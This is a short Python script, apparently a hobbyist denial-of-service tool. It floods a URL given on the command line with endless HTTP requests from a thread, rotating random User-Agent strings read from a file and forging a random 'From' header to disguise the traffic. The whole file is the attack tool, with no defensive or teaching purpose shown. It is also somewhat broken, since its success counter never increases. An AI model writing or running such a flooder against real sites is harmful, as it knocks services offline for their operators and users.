import threading
import sys
from random import randint
import urllib
from logo import *
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple

showlogo()

def readuser(agents):
	fs = open(agents)
	data = fs.read().split("\n")
	fs.close()
	return data

def ddos(url):
	arr = readuser('user-agents.txt')
	max = len(arr) - 1
	success = 0
	minprint = 300
	errs = 0
	while True:
		using = randint(0, max)
		header = {"User-Agent":arr[using], "From":str(randint(1, 10000))+".com"}
		try:
			req = urllib.request.Request(url, headers=header)
			urllib.request.urlopen(req)
		except:
			errs += 1
			print(sys.exc_info()[1])
		if success >= minprint:
			print('Requests sended - '+str(success)+'(Failed'+str(errs)+')')
			minprint += randint(0, 1000)
		if errs >= minprint:
			print('Requests sended - '+str(success)+'(Failed'+str(errs)+')')
			minprint += randint(0, 1000)
			
try:
 urlto = sys.argv[1]
 print(W+"")
 if urlto == "close":
	 exit()
except KeyboardInterrupt:
	print("Closing application...")
th = threading.Thread(name='doser', target=ddos, kwargs={"url":urlto})
th.start()
th.join()
